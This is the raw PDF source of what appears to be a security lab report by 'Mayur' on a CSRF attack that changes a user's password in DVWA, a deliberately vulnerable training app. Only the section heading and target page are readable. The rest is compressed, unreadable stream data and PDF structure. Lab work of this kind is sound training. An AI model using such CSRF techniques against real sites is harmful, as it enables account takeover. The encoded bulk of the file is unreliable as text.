+1 0 0 1 12 5 cm
+q
+1 1 1 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (5.1 CSRF Attack \227 Change User Password) Tj T* ET
+Q
+Q
+q
+Q
+Q
+Q
+q
+1 0 0 1 62.69291 90.83465 cm
+Q
+q
+1 0 0 1 62.69291 78.83465 cm
+q
+BT 1 0 0 1 0 2 Tm 12 TL /F2 10 Tf 0 .2 .4 rg (Target Page: DVWA ) Tj /F5 10 Tf 12 TL (\256) Tj /F2 10 Tf 12 TL ( CSRF) Tj T* ET
+Q
+Q
+q
+1 0 0 1 62.69291 62.83465 cm
+q
+0 .2 .4 rg
+BT 1 0 0 1 0 2 Tm /F2 10 Tf 12 TL (Attack Scenario:) Tj T* ET
+Q
+Q
+ 
+
+Q
+
+q
+0.0 0.0 595.2756 841.8898 re
+W
+n
+1 0 0 1 0 0 cm
+BT
+/F1-0 12 Tf
+14.4 TL
+ET
+0.941176 0.941176 0.941176 rg
+n
+185 619.3898 29 12 re
+f*
+0 0.2 0 rg
+BT
+/F2-0 9 Tf
+10.8 TL
+ET
+BT
+1 0 0 1 186.0929 622.7603 Tm
+(Mayur) Tj
+T*
+ET
+Q
+
+
+endstream
+endobj
+17 0 obj
+<<
+/BaseFont /Helvetica
+/Encoding /WinAnsiEncoding
+/Name /F1
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+18 0 obj
+<<
+/BaseFont /Courier
+/Encoding /WinAnsiEncoding
+/Name /F2
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+19 0 obj
+<<
+/Contents 20 0 R
+/MediaBox [ 0 0 595.2756 841.8898 ]
+/Resources <<
+/Font 14 0 R
+/ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
+>>
+/Rotate 0
+/Trans <<
+>>
+/Type /Page
+/Parent 2 0 R
+>>
+endobj
+20 0 obj
+<<
+/Filter [ /ASCII85Decode /FlateDecode ]
+/Length 1459
+>>
+stream
+GauHLCN%rc'`FV1EVl_11!?;_<X*&)dhWg_XD.#Y)!3!7-/.?0M%3,1otTCL(sC24d>C1$&D>PJH-YAsd0+9u8Gtcu!Bs7dn:^j^?nquH=WU6hi:H$nmYKY&#*'Ed:.-5s6An5tK^[l0Mn%:Z4MK"X&^Et:AK74#2f%(=)F:c_'p-K[/ke1M4,'2:4Q`A;E'ChFJ/)?DfMDaVUiXcncmdL19.b1aGtbP\$`]`Y>UuI\Xjfh]U`ZMA^_\<//"+hi8Qc(0XuO^G%$Q0Lnc@]K$dQ3U=sb!mQLoG'T>'3Q6E-?ZG%Shq)d^j*?s@N!S5=k$%@gj:E-GiFjT'&l6klDQZdZjl2!J:0Pi8X*iCl"a"AW,c,PJsr<oai*#4VDJ8;_.^)a$?jL;R\\]8i>rr'NVaNS&[_)!ua(fRq7)8e!c1Gm6'eCgT[K6uLW?GeO/(j&)iLl=;Rk:2&=*O[6;0d)!<;$7>"rB3]MT#-j?_5mn`Bco$mAFrl*:Yg"SmnIe3@(.mQ^\$7@DLC_\q8/Rb!$VlM_@nmu7k]C?&b4m12,J++McflA/?_W4<Xr5G#VNS:UobX9)f.t*V!SHqS#!Ahn&I)6;[_PCf(*WCpWQZFgNPXFl8_rsTcm?RZVja^$cY+t5#O#GL<G'rq[!c6D_+g3!Fik1l1JMn=T>VI.ii9-j^Jn6=2Z=4HY'@qnNJ52J!N[.?hOBUO%i_ZM;<ip:^s'&7`$T!9K!e/K8CndV6hdipI]tWtrPkMe3mVVJ@3kH!`9_Fb^R-U]lRC'G*n3aD8JT5ghb6\CD_3JsO3U]$m3O*i"Vsm2^sm?jR#!%=qB)\'V66W@/?YR-Ol4uP;Y\0;m,3^7HNQ3A%/t/c4;Srh\ji[W7`]/!!pD`,@**9fD?+/nf1a&5<RjJn"_GNT!C?`Qm'+>sMCJ4g\5*F`?Io;gaq;jBiM>h\ZmW,-M#;G)74QcXlV*A;a1o=uh&D)S6Q^e!O+73+a59nU^9)\YK1+u8XT8Bseol]?q0@V<Kg7#e!sMdj@nD7aNB*2r;f6"rADTW\hsMC=034nR]j7m?aq8[q"jP_6^R)1%=ij.FYY*,Q$SL:3lMoSP\t*WD:G/RL:[7"M[)";2c9EoQ+E$@h4,9l?j2lqhHoDt[1BDh($"q^nSa9/<ed=UGWYf0"2*GincGjbWpKfI>DF>Cq[V&X=iRQFf^Etib@JHKLeYVn6POD6*]\fCI%*Bkc@b#bZa.h"lKBA9<MoG+OqDq,*FPiJ&(di/!a'q"A@`_cL]]?C3#AQS8VQ9-!N.\A>+lS%PW!698M%gk(j[,r\O;rQ4BW)\/YW7#6*nRJh95NXGl:6DRDf]d6hm\B."gJ=LfL0ark%WZ:.*22S^a<rE<c[$cbur8Y`#q9W1r7pj'C-*sZ]nlteA$P#Zj*9g\eE:6qV5,9'#^XIF?muQ,Y?UeqGc3*@09%"!D_0Q_>~>
+endstream
+endobj
+21 0 obj
+<<
+/Contents 22 0 R
+/MediaBox [ 0 0 595.2756 841.8898 ]
+/Resources <<
+/Font 14 0 R
+/ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
+>>
+/Rotate 0
+/Trans <<
+>>
+/Type /Page
+/Parent 2 0 R
+>>
+endobj
+22 0 obj
+<<
+/Filter [ /ASCII85Decode /FlateDecode ]
+/Length 2281
+>>
+stream
+Gb!#\gN)%,&:O:Slr1r!V[rkA]Qg=&aj#f,DWBAaqVmnQ/4'tJMPLR*ZLd`pJ/;'!7WPP)@bHnn/:b'b4U2?kE:?<`qd]`sC(-kY$C&AO$Ig:AN%a/WpuMF-2O<,GI`*E;!I"j0r!<1.1SLN&7LTQ\*;gQXV1J(=:sMfkm)OMC6;#*K$K4L&-m_PoS2b[c1hik1m'LSE;Z&#CkFq%;ksBaT`sWl<[D;/8V`oZm<LV$-ga-[/T>6(``WA+q;@+/m,ct%/BCJf71&5%%&*$G>IUOT&J?O=srh0S6B<C?'5WB.!KBU4ucnO;oljjQkLPGbcd-r]BL3920ej;a_17sAE1DmU!Qff0oh`i>&N"QoqX^J4=S>\6Rhgqn!ZpNtaTE#Y/SAFGlPV];t9$H?6]_V?c9<c3$kBu*V>K6W=A])n)s0hjZK'PpE&+0eK+]5?tWD9a7.:Q+/;i+6j,cE)ejT;<87\(QM,2bTu,k=XS^uhQ>+DSK64K:2nH;+HhB[Jm\i6e.JkWO`:RTo92>[O)=>jLBc1nlND%_h-TITVKT6]XZm<24._qROC!q2(21pFGoI<!]=dnH&''c<sDs8O5=sU(I?3!qk.YKM^:uCjhb*\X'6foi[Id/T"8AFe3<8Ba+;HH:T2S<0<%c):sdIap0@n"X6[q's!QM1U3%!^j/rF\L^%rJcQOI@1Uc]lPR",G'Gk\EP@*??@n^s04U@W290,8LlTZ7_q\[KnYstTI&m+\O9(8EbADg@I\+@M%OXP-K0b(IaOo)%^G,BKURY9h\?'['7%-f4]Y\g:@sJ&eH,+bd^0/`>k&h<[P"bEMVQ3Bh;Tt%$]L;%f]\GeYi\Ke?mo[eNZKUT0Pnd(c'MOWtF/5nY@Z^8W`IOqAj@$s=+-<4?5n-%W,JuQtBn_dh<n=?be$6A.eEf&&0'+,+Ld7+PNERH`h#YIU86eobX]4\Dl`l_k?K+ik_%,V9M+#rob(28%A_s]CR/$Ze7eF@,,OSU!^/UK]O4M7GQS\`9hj?5P&][\$m)?MJ)5/CgOkY#g&l35%C]!g&/;ePB'>mEoo":pgFKm747.7R,OhMg5BPh[,0.=)?lre7ajqle[4?Efa;g[;6%/91c]=_nTDNl'J`n9<]e+;D70CO'g#/FC-!W7JUiXE!\7-.R7c1ZD3FR4AH+NdQMcUIuR5F613-53?m_6<QWfSn@:^hZ<m\!t;VE3\[(qYFZKnbVA/OINCOc`hVe)T,$.j[51@9'7g&RdT?.LDl;lmR<Ns&iGcaSL[FlIBJ541%ZI*V8*t58G>(YXtS>*FP5\K4&rJk5t*AG<L*HO$$TsPdE5hdn'_U5bte>/T@^iJi3'f\P]<tV*V5Z8NGVj7=T@+>)>6`.#!t37[GY!<J/[-W^o+UAe[!eW:Mg3V@]og)l@tBZMdS5\%kA%sG?Pr%e)!6hg0HqE,APrELUMW8T(6PcQlc`T;JtQ>#.>TCC=2p9`MC+K7K/$>2\UMhM/L[[f47&+_hFm*"J(+sSVN)f2+D\Q=m%]HO/*I7puace1/3uk-]3;.AVq5c\ie*Y#%N]!p5jjE7T!k^Od'm\djJ)$,f\_DhOa/6Qab@P3I+m%D\=Aa0^KSP?WENneGqpDJ;Qj[/28gdF)8uUXD@#29TL54jr[44S\Y17:MD.T#*RDG;DbZ&9+5F5LT%o\Q-:Rqqn?\^.W^XZocp%W@Y$V/.5R710T/0Mpsuii@AMYT_'/"j*g.r]#C4Ni;d+hNQ*.\UD!.j*bln5V<Fl1i'bUXU`X`-;,_iR'HG.,H_eBnE)9QH:3!_Y1%)*F/YG#_4TdXVYQ4mC<[nW-Abdo\MWck2RE"ofTGiT:j_(d3@C[g+(nr8rhJh'u!o5Z#7!tN2lS8u3orZc>00paiJA;6@<N8$THVtm*]3,3%iLTlqfI"L,%mML<e3h^VNE&,Hq*aD0B>a60nm8b"Zs)%tGLNW2$PAac:D@?kRei>>Mp3T.os*3D1";0NC&oCCrpAQqW.;D`]Q3jRV`_;'m/e)[uM+A0(/SZc#%c@g2p"V&K?b/,aa=>I@n`p(t(qFGXKB76Q7:H`Xh'F+i\%7SUHWZ0m>!D3R:ikfE@H@W@bN!-%+CoP-d>M@u.;"@N0J>j42cboF#@M\8a?Q<4q`B.4M;*)E.92LC83^=uW6-1DVH)=qLWt`Gleh;SK5m.<E;8RZ3c8U"mE%A@oBPp[PAiDaFr`;#9.ZLR_ppld3\L&Q3iM1LYVQ"ReK!i-S*^Jr/dcI']Zuh/X_lp!WS9ZA-iX0aY0e3~>
+endstream
+endobj
+23 0 obj
+<<
+/Contents 24 0 R
+/MediaBox [ 0 0 595.2756 841.8898 ]
+/Resources <<
+/Font 14 0 R
+/ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
+>>
+/Rotate 0
+/Trans <<
+>>
+/Type /Page
+/Parent 2 0 R
+>>
+endobj
+24 0 obj
+<<
+/Filter [ /ASCII85Decode /FlateDecode ]
+/Length 1707
+>>
+stream
+Gb!#\gN)%,&:N/3m._l!4/*#MSk^>se8E]+=sqlpdi#p9'IYc78-K!gW*eEc0+^]Z1$q"rXKcFM]@aFp]8M@Lf_?W?GJ"-)Z%2X!!CC4W!-'S,(2r,A1&3XLNMK?%5GAa@^iq@Cq%;oNZpbu5"2h$=9lS?XRG-T8@U7`m.iY(g0VoPTo3?k)T1U^NVug;g8sDt$i*uO\M<sEW(Jg[?iZg"'dX^35k;H/>s*11V%8$Y"MT+2?FrRT(S`f6,US9Sq2&"Sh#ob5Q[Lc)&;P#Ik8URkf$AL?j9N>9W,EUCDnW:?u]Ku,p9uG+OWLgr=P[Z8KR,IT0V4<Gf^>9U$V7rl?&;g@1&3V:?0qf.g6ZC:`Of,2jpf;@E.<<NRj7u;Q5uIuMAK5b?P;7cl=J[6U`UCjbls"F4PkbqUZRkK[qt>p12t/HK,iRI>6kjE-=IRdCo(>Jo&\pcGqF^qZ$@%"Mi42>8e&2HK!i@JoP+s#i_$u59L/A44*!d%r:D:?DUNX*+*5.KqpaW5o-$hE+7t4V4d'cbM.ni;<ro0931N=jA[=_O#6Vp<5c<7T>ktS)5*H^.t/=S^"d.t?T$&l[PD+.Lh?sA&=RoliV,#=+K9F^]r#5]1F&=@Y!+5FS.VYLR0,Lje:1%$^4W),M`2PS"XOR4/Cng%M+3Wd_LN]/N'de0@]_63-53\F892:9huYg"LfA#:a\YSBfP/;:V1=q@YZOk,?0YsU#I88p8'cs7l8,BAV'G!h$CTjpMD+b:/)'Mr>@NepBbTsr.5\>a##mea('L3G97qtF:A^"'+=MY-4`<%10X[(K_jFQ+gd"4O]YatXpt5\JP,$H0oCEi@I74"CIU)>nZ'a2X'^K!6L"Jn%qG,T_2rB0/s\r&@PuFIf:93Z>o1n9#75fIZ^$a;(<!Ze!UY=b39Y]?=-JIjXr'e<f[`r#@>5\pPui`i;Y8=JQl>Z7#mBqp(@*fE;$$mF\aVCq`W?:>h`8)#<lu;!a#pR`A'LQr]+9;l=PWl87r7E#q8_j>ZcrbYA=Go@]`T>mo^6X;Wr`C5dLZr=KElVR%]ls-6)ajh<Pi`EuF?q"rg0(q>==2FnY:]8bn"BH&S]^4(D11<8GQ&]lkAmRsESb_lhW\*)58D,I>HFLD`3a&Y^sF8l_BblXesc=_C0=IbrJo.fFuE(_6?VD3$s16(;nPi%L<65.Q!lqA+nVVhpgNS[7P/i0<m;A<>lV-Fh_,gB<WLj9Pe`l*9c1lC?1m,"*,q.5;IMJpgP>FOGjCpO9]isqaMnKj&diji!gA!;X;l'`')j$?p6oXkK)C<m<iL[_6h^>JJTj2CN]:B8;qqqi_+A8=6?otL1J_[Ohk.D%ZMpKlSp_2cTfKli[6S\h(g,(2&K[tB*:B*Lln"Eo9c#op>dDU0&A%tOB?e(-X$8KATcK,O$<djV0(<6q&MIbsV4HL(49)78u?ml.D)8OK3k/c&eh$&q3R7IT,HbVcJCOde71NL/2o6T9@20qEA#cWN+kgS^ld-l5[Oh0l&;WSKkHDmK8dWfJK1eb,YK1YnpfIb/m#N.#1'g+Ged5Fj8OlFn-<[UhOW2_G8dQ3`Lm2fUYU]^>V&i,<C"i2AZS8%@N2rf>u,s4Dpu?I9kTL*(hn2\+VKi+U4G<b?(n71;s;c]TYc>gcorpNGe/D[&^Ip1;6Er4,0Wa1#o4N([7ZD;mGG#q#ZRnZPZu~>
+endstream
+endobj
+25 0 obj
+<<
+/Contents 26 0 R
+/MediaBox [ 0 0 595.2756 841.8898 ]
+/Resources <<
+/Font 14 0 R
+/ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
+>>
+/Rotate 0
+/Trans <<
+>>
+/Type /Page
+/Parent 2 0 R
+>>
+endobj
+26 0 obj
+<<
+/Filter [ /ASCII85Decode /FlateDecode ]
+/Length 2862
+>>
+stream
+Gb!;e>BAQ/%Xua-^f-_?&m=tPcH_j"V;C9,d\aJ-mR(T0<11#Ab*!rG9lb^]JeCYsNbQ%\:HR=<EG5Is57dtfOTt%EA(88g"i/4_#"&J$'.11rfU<8596`PO]A#-OUuQ3-?j6g[NhmVE)k\6qCQ@fGJR8d"Zb7&;9G_O&d!QqM5/KcTi:aWC?&4<1oQhqWa[#Wdf@Vu`MlR\c#u;=M_%`*8/aN]\]`3@A^4o4F1YXjcl+q*-SJ:%A^pmQ!_W((p9YSC)2`BLtr4/kXJ*;jYRKB;PBo_GgCa'tPH,7lK.BqY:[b5eUak^?T(:^s=g[\:aS,.GVmK4eG@+UIl1d&8)VITXn9hU&<CXZ*f;:tLUYW=+:"VQMX>61a6dG0\U%T=$mV't^6U5&r#(5hu`gms1abd+&^lUVu'YBcFJ8Yo3_P%&6VM3F;j_M"/<9\6>6JZd\/m7Po#Q6l%*<68?nTXgY,9)11NBiT>0=1@09N4N6J37a($9:ZdM2j2$t'To]>%@5Ed9DU>`,JuJaE03U]<Q8/K2uArZMns(OEV$%<3B(pNl18m:kXKYJ[(<L8X]fQFm/BJhHXL5D2;h3#:Q!2_B!W]*kA^XB0M\X"PWe5aQ)c\GcGOZtVJmQAjaC0'd=F_'IHt0a@=mHn"1S]e.TAB53eH\a`Y#Aq*FUgc\4FAtLuKWP@HWO.&!sC.0)Wb6([p6%I0hWaHP^&AfOFB]k\`*/3lc%EbU&*b^#=p7nZ3Ne=$I^dL2sudF<7;8dKc/?D?JPBG6cdi3FJ`c4D&P8G.NRS-qeL==]L.0/35_CC1Wp\i-[;jDN13NE(UJVVJ1IoD3S:BhIpV#[chd(UU_&)"=!ZPNCQCb`\_k-/b1G=.IGmhgrB5K:@X")_JpVdF#(6h^BQ5a=<d,'"h3u=&a$V!:T>W-EC$h@'^1A^kVXD@Y3:8f`5d!rMM`#`Ajo,GHQ:T:E&5n9_A2Hh/kdsaE>;Ekere%eh;pahUcb:<L?t5_LBTcTn=XDKf`Ric(m.8,n?8F3gRNW9esXk;?/i28h@i?MQkUC98)nhd?psE4<+`0k,JCJp\$Q3"%l&`N&[LV%SRU"Lf%-hIg0H%A;U8_10eUphOd.5Ea!D]q7@[<#BW?3=^d[(E'tE4jSHJN>D1]f8e*[8(Di=E[R?!Dus5LesH^`.WGd.$)qK!1(i4YpBMmd#*bll%/Qeq,VQbM$4JfPGW+\%$o?"Rl20qV2WCW\7T3Sc<(atDa5h(ENd/o(b(CW\8>Bc='%])8C-q!B?^V)c'Q'^VY6fQIMd1037?fL?NAC_!buHHGf]-:h7RCpa/,D`4l:qIN%d/,?=gGa`MRC;+J1L(q-b#,.HXffNjE:PjNFhP'h:T>A78CN)rrf$Ci^8K&@a<l-@<<bOUrb7o2VM77h&ol,B7FYq:H/YrtOgil*CM%:;*>758"F_QD>3d._2n*]c1oit^<;oQ@12V3"eV+DEjmT<`?[?VM7be#/?W>C&4M@<0Q[fWTF^()6K/=^V9c),&dSnGD[,>qPK<MX$Scn%h.Kno39o,+p7p6R1*+"4:%]S;kH_>*EZgX?I.,q0=F5rOImpK.#hjj=Y[ommm#-V5Gt@gagA3(upe%sV&Db/:OX"4t:?805'HO52jYKt9Ne#tK>;p;,kuJ!BUtr1>Yd"hiT=NLI%hhY]+d?hY]Y_q*74<+uZJ=TKZiYJ&JAPj?Z[+t7RGTpqd%=HkcA2fJ2Y594,*d"s>H!=>0pHlQF$h,K&chdH]$Ys!&DX,@p\A<b$49dCm'c&4E^.$S.t.JA61R%U5aN;WALjHA]r'LNAi`=-E>KDQL$6lF'Cc'e[(d"@E!]3\O.6AZFj8eXY,.UdL4%23p0<T8=b_Z^o.R>9i0Qc"_&Ug-aF#4aF@d@`t^Q]ejr7fe^6;ms:lItiB@PH02),E=%hqY_0M;BA/neI`<H>M'u\0^8h_"m;-4^CLP0H^le$4t,S>8[NlJ@'(':(oQ=c;201F4<XT(a-jjn=@-9Dg`1NYG5lbd,_*jnF\J'9kH>NJ*e]!c7Kn@^#V!(CgLF8uoKhG'$'ATnL.OLEUO1.$=-*j`VHA:1'1H&h;FkcV%(G6t>Re;-iQ'+;%E7qYZG%&Y?e58#X)QtT/'d9")_EJeFIO#IX)QI"qlrb0euZ$k776\t.o=^H2;ceuFTmZ"KYZE8B)">?/4,IZ)OR9W<cHaK07AU3$k:K9aaA$paiaIS/0W1?6r+tDg&XMr%&Fn*9D8++Tr0MU01a@fG#t"p[JAgnr/&N3fB#dZDHE2%R^97SBAG*R[iqEcM7TT&6!*0i1K@KpV6KACQ:@NUS8<N&g,rA>(ZUCBBm)k\m]/i'cO("<X<`i;=cmk5X<q&\p<acNe$jCWWB6R-Z6Ub$ATp%*$M)b[`R$f=ALVmGaOY&<lXV''0[6>L($85U`QI&AU!]^0d2OQYDWoE6Sl]96=7M4-<@31!M2=ICHXcW>lobZDEML2*O`g1^=Uc+C;_4gf0[j#^le1p!_!UneM`?DdnW[RO.i6unD]_e?VN&K"_().+L;Ur[5M'6T-5$c>217b7/9BI`.d,JJqdcZl`7tAEA=0=KK\5n_rKHV@nJp<Se@04<lEd!-#5br+P7UlU3DEMfQA.b0ePGYC<MJJ/XPWD,XM2cYDt4jArMmPiI]9Zl5X3k''&H37$&l]qO#_*n.IO%>6q8srE=1Cc<].AN3iXNU[AR%HCgZNVl^-[\M67'&2]U"BP`a__q46WM--%IF'">:FON$"/jHi<c&jq&4T70@`(Wa2SRZZn3[1]/R11Z>^7jP!T&ki73I-\h/Q%G_.$i-+IgR@@`Nu$aT*Ob&hbt?N&9/Msf'^Yc#R%]`V~>
+endstream
+endobj
+27 0 obj
+<<
+/Contents 28 0 R
+/MediaBox [ 0 0 595.2756 841.8898 ]
+/Resources <<
+/Font 14 0 R
+/ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
+>>
+/Rotate 0
+/Trans <<
+>>
+/Type /Page
+/Parent 2 0 R
+>>
+endobj
+28 0 obj
+<<
+/Filter [ /ASCII85Decode /FlateDecode ]
+/Length 1377
+>>
+stream
+Gau`R9lK&M&A@sBb\?D2,$^9,m\rc9l*`:m,Vkf0HD+p(<`ThJ;MsJ,5JBMM_c@C'$M7.&[V0\<1[f>G;%t"_W;TEuJ;Y_$^8=.5/2ogWik]X9=3K:WN:rQd5_>BB'LLD!1_*uB%[TcR;&TXP0T=M)<oOda#@9ei'ZCZS0a:7cjs,1.=)W\sn!H'm+I_p_7DuZ,Ys'J(*c_V(Fj+S$o8?(<O>L)li%N):ppI2W8juat-SnfJ>,WNOq#JU!`ead'nIUD&0+)b3E.BqY_*25<;u=+@?,,ncLG,qIPHb'*)[dLV1nk52$b=MSa9H$]%D5r`VKmI'Tl/:XBYA-NI")iL6<;St\eckf7,"T@hSWF2OW+1*\V^:rC'Hpd#3:F"qj3lk^0]iuQ>g1#F=/2rjX/_'75VFN)h&l@,VYi%?Jk4#R3<<I/QN+6Y,ZP6E+1A'1I(jVQ_!BR1JX^aqt=.l7go*q>G.*KR*VkG@6?`mI(poCXH%f,j]d'P)Al'3)jkcMC`<*Bh%"Y!dGWE:"#CZH1i73e[)%TrV9WWC%RG%`m/2lAE3ut6f2`J&Uo5dZap;7p1<gc/ams*U4,>8X#-grDjp&#_NWssnNWtQn9W5j&/sQ,s8.k'k"WEbE%ep<Pc0*>WD.10>qAZrKiu1rbP`l<j=tH[Y?jdW-cZ:N0K2h@;rHWDc93E/$:JG.&`E-36eX=e2$7%Z:MmCVd=]aPa%?=#>&a$VVouqY5SuZ+.7NkS^C97@eJ)$Zc#,mg2F.CPO$:O]S.9RGMP!F'"5ad!2BoW$cEu!$/ii/1^9QeTq^>`<iJtG%+fo!X!HE)YCPNSCMKrfK[e5GsFGpbM\Yho@Q'&[oWdr.C\[4#Rb0j)I(>UF[H]`mUN8!et@*A=nAf-CA0`a0Xq2LM9RqE[Kf[;Mg-:CET]]FS=>4<UfS)5?N!l$]R%$5(/6BPDHFdD(g/Bm^i<N-=_]JVMqe[M"X\d'^;"<'kGt.]dAtj`VbsJC.mjB_&=X1RlKSe2e1WONg@EC//=%qL&FYj:So=gH_ISI=p9->P,>W6\[%d;CS:i=ftIS"leG1XodrJD"e'u=?`Te1(C'r&Ii+9d>sa7n#G4@$*H>C3[Z!lg$;fUj'b=3FRIn<$pkRproo.Hr*eE_[T:9NM*elsV)O3kV>!qG5:-m5_pdSWE&;g9&"ZW'PRlYaOU8@!pM+880.RRIKA/`Mgl4Fd=5s$&kG>+#OdirD\C3B4fSPM)9?t8g>jbZq"@Gn2J?+!_R7dI9]4n^s^>bB'QW8""jAte[T_E8kep#cdGI[gge+p_1HplY=VYHV>;*6XN`-L+GKNG%-$q,[nq)<'97fN=3ne5UIa,V6qE>1GYJ>p.%!6kECbppd2~>
+endstream
+endobj
+xref
+0 29
+0000000000 65535 f 
+0000000015 00000 n 
+0000000054 00000 n 
+0000000162 00000 n 
+0000000211 00000 n 
+0000000486 00000 n 
+0000008559 00000 n 
+0000008666 00000 n 
+0000008773 00000 n 
+0000008885 00000 n 
+0000008968 00000 n 
+0000009074 00000 n 
+0000009152 00000 n 
+0000009354 00000 n 
+0000011296 00000 n 
+0000011370 00000 n 
+0000011661 00000 n 
+0000019277 00000 n 
+0000019385 00000 n 
+0000019491 00000 n 
+0000019693 00000 n 
+0000021245 00000 n 
+0000021447 00000 n 
+0000023821 00000 n 
+0000024023 00000 n 
+0000025823 00000 n 
+0000026025 00000 n 
+0000028980 00000 n 
+0000029182 00000 n 
+trailer
+<<
+/Size 29
+/Root 3 0 R
+/Info 1 0 R
+>>
+startxref
+30652
+%%EOF
